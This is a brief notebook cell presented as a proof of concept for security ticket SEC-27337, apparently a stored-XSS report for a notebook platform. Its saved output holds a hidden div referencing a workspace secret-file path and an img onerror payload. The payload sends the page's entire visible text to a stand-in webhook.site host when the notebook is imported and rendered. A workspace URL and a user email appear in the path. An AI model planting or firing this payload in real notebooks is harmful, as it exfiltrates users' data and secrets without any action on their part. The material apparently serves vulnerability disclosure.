# %%
# SEC-27337 PoC — pre-saved output renders on import, no execution needed
# Out:
# <div id="sec27337-loot" style="display:none">STRING_STARThttps://adb-2548836972759138.18.azuredatabricks.net/ajax-api/2.0/workspace-files/Users/david.lin@databricks.com/SEC-27337-secret.txtSTRING_END</div><img src="x" onerror="new Image().src='https://EXAMPLE.webhook.site/sec27337?leak='+encodeURIComponent(document.body.innerText)">
